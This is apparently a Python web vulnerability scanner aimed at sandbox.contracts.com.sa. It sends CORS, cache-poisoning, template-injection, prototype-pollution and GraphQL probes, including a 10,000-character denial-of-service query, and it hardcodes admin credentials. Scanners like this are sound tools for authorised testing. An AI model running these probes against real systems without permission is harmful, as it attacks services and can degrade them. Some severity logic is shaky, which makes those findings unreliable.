#!/usr/bin/env python3
"""
Advanced Security Testing Suite
Specialized testing for modern web application vulnerabilities
Target: sandbox.contracts.com.sa
"""

import requests
import time
import json
import re
import base64
import hashlib
import threading
from urllib.parse import urljoin, urlparse, quote, unquote
from datetime import datetime

class AdvancedSecurityTester:
    def __init__(self, target_url, credentials=None):
        self.target_url = target_url.rstrip('/')
        self.credentials = credentials or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        
    def log_vulnerability(self, vuln_type, severity, description, proof="", impact=""):
        vuln = {
            'timestamp': datetime.now().isoformat(),
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'proof_of_concept': proof,
            'impact': impact
        }
        self.vulnerabilities.append(vuln)
        print(f"[{severity}] {vuln_type}: {description}")
        if proof:
            print(f"    PoC: {proof[:100]}...")

    def test_cors_configuration(self):
        """Test CORS (Cross-Origin Resource Sharing) configuration"""
        print("\n=== CORS SECURITY TESTING ===")
        
        malicious_origins = [
            'https://evil.com',
            'https://attacker.evil.com',
            'null',
            '*',
            'https://sandbox.contracts.com.sa.evil.com'
        ]
        
        for origin in malicious_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(self.target_url, headers=headers, timeout=10)
                
                cors_header = response.headers.get('Access-Control-Allow-Origin')
                credentials_header = response.headers.get('Access-Control-Allow-Credentials')
                
                if cors_header == origin or cors_header == '*':
                    severity = "HIGH" if credentials_header == 'true' else "MEDIUM"
                    self.log_vulnerability(
                        "CORS Misconfiguration",
                        severity,
                        f"Permissive CORS policy allows origin: {origin}",
                        f"Origin: {origin} -> ACAO: {cors_header}",
                        "Potential for cross-origin data theft"
                    )
                    
            except Exception as e:
                continue

    def test_jwt_security(self):
        """Test JWT token security if present"""
        print("\n=== JWT SECURITY TESTING ===")
        
        # Try to find JWT tokens in responses
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            # Look for JWT patterns in response
            jwt_patterns = [
                r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*',
                r'"token":\s*"([^"]+)"',
                r'Bearer\s+([A-Za-z0-9-_.]+)'
            ]
            
            for pattern in jwt_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if self._analyze_jwt(match):
                        break
                        
        except Exception as e:
            pass

    def _analyze_jwt(self, token):
        """Analyze JWT token for security issues"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return False
                
            # Decode header
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Check for security issues
            if header.get('alg') == 'none':
                self.log_vulnerability(
                    "JWT None Algorithm",
                    "CRITICAL",
                    "JWT uses 'none' algorithm - signature bypass possible",
                    f"Token header: {header}",
                    "Complete authentication bypass possible"
                )
                return True
                
            if header.get('alg') in ['HS256', 'HS384', 'HS512']:
                # Symmetric algorithm - test for key confusion
                self.log_vulnerability(
                    "JWT Symmetric Algorithm",
                    "MEDIUM",
                    "JWT uses symmetric algorithm - vulnerable to key confusion",
                    f"Algorithm: {header.get('alg')}",
                    "Potential for signature forgery"
                )
                
            # Check for sensitive data in payload
            sensitive_fields = ['password', 'secret', 'key', 'admin', 'role']
            for field in sensitive_fields:
                if field in str(payload).lower():
                    self.log_vulnerability(
                        "JWT Sensitive Data",
                        "MEDIUM",
                        f"JWT payload contains sensitive field: {field}",
                        f"Payload excerpt: {str(payload)[:100]}...",
                        "Information disclosure through JWT"
                    )
                    break
                    
            return True
            
        except Exception as e:
            return False

    def test_websocket_security(self):
        """Test WebSocket security"""
        print("\n=== WEBSOCKET SECURITY TESTING ===")
        
        try:
            # Look for WebSocket endpoints in page source
            response = self.session.get(self.target_url, timeout=10)
            
            ws_patterns = [
                r'ws://[^"\s]+',
                r'wss://[^"\s]+',
                r'new\s+WebSocket\([^)]+\)',
                r'socket\.io'
            ]
            
            for pattern in ws_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                if matches:
                    self.log_vulnerability(
                        "WebSocket Endpoint Found",
                        "INFO",
                        "WebSocket functionality detected",
                        f"Pattern found: {matches[0][:50]}...",
                        "Review WebSocket security implementation"
                    )
                    break
                    
        except Exception as e:
            pass

    def test_angular_specific_vulnerabilities(self):
        """Test Angular-specific security issues"""
        print("\n=== ANGULAR SECURITY TESTING ===")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            content = response.text
            
            # Check for Angular version
            angular_version_patterns = [
                r'"@angular/core":\s*"([^"]+)"',
                r'Angular\s+v?([0-9.]+)',
                r'ng-version="([^"]+)"'
            ]
            
            for pattern in angular_version_patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    self.log_vulnerability(
                        "Angular Version Disclosure",
                        "LOW",
                        f"Angular version exposed: {version}",
                        f"Version: {version}",
                        "Version information aids in targeted attacks"
                    )
                    break
            
            # Test for Angular template injection
            template_payloads = [
                '{{7*7}}',
                '{{constructor.constructor("alert(1)")()}}',
                '{{$eval("1+1")}}',
                '{{$on.constructor("alert(1)")()}}'
            ]
            
            for payload in template_payloads:
                try:
                    resp = self.session.get(
                        self.target_url,
                        params={'q': payload},
                        timeout=10
                    )
                    
                    if '49' in resp.text and '7*7' in payload:
                        self.log_vulnerability(
                            "Angular Template Injection",
                            "HIGH",
                            "Angular template injection detected - expression evaluated",
                            f"Payload: {payload} -> Result: 49",
                            "Potential for client-side code execution"
                        )
                        break
                    elif payload in resp.text:
                        self.log_vulnerability(
                            "Angular Template Injection",
                            "MEDIUM",
                            "Angular template injection payload reflected",
                            f"Payload: {payload}",
                            "Potential for template injection attacks"
                        )
                        
                except Exception as e:
                    continue
                    
        except Exception as e:
            pass

    def test_http2_push_vulnerabilities(self):
        """Test HTTP/2 server push vulnerabilities"""
        print("\n=== HTTP/2 SECURITY TESTING ===")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            # Check if HTTP/2 is in use
            if hasattr(response.raw, 'version') and response.raw.version == 20:
                self.log_vulnerability(
                    "HTTP/2 in Use",
                    "INFO",
                    "Server supports HTTP/2",
                    "HTTP/2 detected in response",
                    "Review HTTP/2 security configurations"
                )
                
                # Check for server push
                link_header = response.headers.get('Link')
                if link_header and 'rel=preload' in link_header:
                    self.log_vulnerability(
                        "HTTP/2 Server Push",
                        "LOW",
                        "Server push detected",
                        f"Link header: {link_header}",
                        "Potential for cache poisoning attacks"
                    )
                    
        except Exception as e:
            pass

    def test_subdomain_takeover(self):
        """Test for subdomain takeover vulnerabilities"""
        print("\n=== SUBDOMAIN TAKEOVER TESTING ===")
        
        subdomains = ['www', 'api', 'admin', 'test', 'dev', 'staging']
        base_domain = urlparse(self.target_url).netloc
        
        for subdomain in subdomains:
            try:
                subdomain_url = f"https://{subdomain}.{base_domain}"
                response = self.session.get(subdomain_url, timeout=5)
                
                # Check for takeover indicators
                takeover_patterns = [
                    r'page not found',
                    r'no such host',
                    r'github\.io.*404',
                    r'herokuapp\.com.*no such app',
                    r'amazonaws\.com.*does not exist'
                ]
                
                content = response.text.lower()
                for pattern in takeover_patterns:
                    if re.search(pattern, content):
                        self.log_vulnerability(
                            "Potential Subdomain Takeover",
                            "HIGH",
                            f"Subdomain {subdomain_url} may be vulnerable to takeover",
                            f"Response indicates: {pattern}",
                            "Complete subdomain hijacking possible"
                        )
                        break
                        
            except Exception as e:
                continue

    def test_graphql_security(self):
        """Test GraphQL security if present"""
        print("\n=== GRAPHQL SECURITY TESTING ===")
        
        graphql_endpoints = [
            '/graphql',
            '/api/graphql',
            '/graphiql',
            '/api/graphiql'
        ]
        
        for endpoint in graphql_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                
                # Test for GraphQL introspection
                introspection_query = {
                    "query": "query IntrospectionQuery { __schema { types { name } } }"
                }
                
                response = self.session.post(
                    url,
                    json=introspection_query,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                if (response.status_code == 200 and 
                    'data' in response.text and 
                    '__schema' in response.text):
                    
                    self.log_vulnerability(
                        "GraphQL Introspection Enabled",
                        "MEDIUM",
                        f"GraphQL introspection enabled at {endpoint}",
                        "Schema information disclosed",
                        "Complete API schema enumeration possible"
                    )
                    
                # Test for GraphQL DoS
                dos_query = {
                    "query": "{ " + "a" * 10000 + " }"
                }
                
                start_time = time.time()
                response = self.session.post(
                    url,
                    json=dos_query,
                    timeout=15
                )
                end_time = time.time()
                
                if end_time - start_time > 10:
                    self.log_vulnerability(
                        "GraphQL DoS Vulnerability",
                        "MEDIUM",
                        f"GraphQL endpoint vulnerable to DoS at {endpoint}",
                        f"Response time: {end_time - start_time:.2f}s",
                        "Denial of service through complex queries"
                    )
                    
            except Exception as e:
                continue

    def test_cache_poisoning(self):
        """Test for cache poisoning vulnerabilities"""
        print("\n=== CACHE POISONING TESTING ===")
        
        try:
            # Test for cache key injection
            cache_headers = [
                'X-Forwarded-Host',
                'X-Host',
                'X-Forwarded-Server',
                'X-HTTP-Host-Override'
            ]
            
            for header in cache_headers:
                malicious_host = "evil.com"
                headers = {header: malicious_host}
                
                response = self.session.get(
                    self.target_url,
                    headers=headers,
                    timeout=10
                )
                
                if malicious_host in response.text:
                    self.log_vulnerability(
                        "Cache Poisoning Vulnerability",
                        "HIGH",
                        f"Cache poisoning possible via {header} header",
                        f"Injected host reflected in response",
                        "Potential for widespread cache poisoning attacks"
                    )
                    break
                    
        except Exception as e:
            pass

    def test_prototype_pollution(self):
        """Test for prototype pollution vulnerabilities"""
        print("\n=== PROTOTYPE POLLUTION TESTING ===")
        
        pollution_payloads = [
            '{"__proto__":{"isAdmin":true}}',
            '{"constructor":{"prototype":{"isAdmin":true}}}',
            '__proto__.isAdmin=true',
            'constructor.prototype.isAdmin=true'
        ]
        
        for payload in pollution_payloads:
            try:
                # Test in JSON POST
                response = self.session.post(
                    self.target_url,
                    data=payload if not payload.startswith('{') else None,
                    json=json.loads(payload) if payload.startswith('{') else None,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                # Look for signs of successful pollution
                if 'isAdmin' in response.text:
                    self.log_vulnerability(
                        "Prototype Pollution",
                        "HIGH",
                        "Potential prototype pollution vulnerability",
                        f"Payload: {payload[:50]}...",
                        "Object prototype manipulation possible"
                    )
                    break
                    
            except Exception as e:
                continue

    def generate_advanced_report(self):
        """Generate advanced security testing report"""
        print("\n" + "="*70)
        print("ADVANCED SECURITY TESTING REPORT")
        print("="*70)
        
        if not self.vulnerabilities:
            print("No advanced vulnerabilities identified.")
            return
        
        # Count by severity
        severity_counts = {
            'CRITICAL': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
            'HIGH': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
            'MEDIUM': len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
            'LOW': len([v for v in self.vulnerabilities if v['severity'] == 'LOW']),
            'INFO': len([v for v in self.vulnerabilities if v['severity'] == 'INFO'])
        }
        
        print(f"Total Advanced Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Critical: {severity_counts['CRITICAL']}")
        print(f"High: {severity_counts['HIGH']}")
        print(f"Medium: {severity_counts['MEDIUM']}")
        print(f"Low: {severity_counts['LOW']}")
        print(f"Informational: {severity_counts['INFO']}")
        
        print("\nDETAILED FINDINGS:")
        print("-" * 50)
        
        for vuln in self.vulnerabilities:
            print(f"\n[{vuln['severity']}] {vuln['type']}")
            print(f"Description: {vuln['description']}")
            if vuln['proof_of_concept']:
                print(f"PoC: {vuln['proof_of_concept']}")
            if vuln['impact']:
                print(f"Impact: {vuln['impact']}")
        
        # Save report
        with open('advanced_security_test_report.json', 'w') as f:
            json.dump({
                'target': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'summary': severity_counts,
                'total_vulnerabilities': len(self.vulnerabilities),
                'vulnerabilities': self.vulnerabilities
            }, f, indent=2)
        
        print(f"\nAdvanced report saved to: advanced_security_test_report.json")

    def run_advanced_testing(self):
        """Run all advanced security tests"""
        print(f"Starting advanced security testing on: {self.target_url}")
        print("="*70)
        
        advanced_tests = [
            self.test_cors_configuration,
            self.test_jwt_security,
            self.test_websocket_security,
            self.test_angular_specific_vulnerabilities,
            self.test_http2_push_vulnerabilities,
            self.test_subdomain_takeover,
            self.test_graphql_security,
            self.test_cache_poisoning,
            self.test_prototype_pollution
        ]
        
        for test in advanced_tests:
            try:
                test()
                time.sleep(1)  # Rate limiting
            except Exception as e:
                print(f"Error in {test.__name__}: {e}")
        
        self.generate_advanced_report()

if __name__ == "__main__":
    # Configuration
    TARGET_URL = "https://sandbox.contracts.com.sa"
    CREDENTIALS = {
        "username": "azmadmin",
        "password": "P@ssw0rd"
    }
    
    # Run advanced testing
    tester = AdvancedSecurityTester(TARGET_URL, CREDENTIALS)
    tester.run_advanced_testing()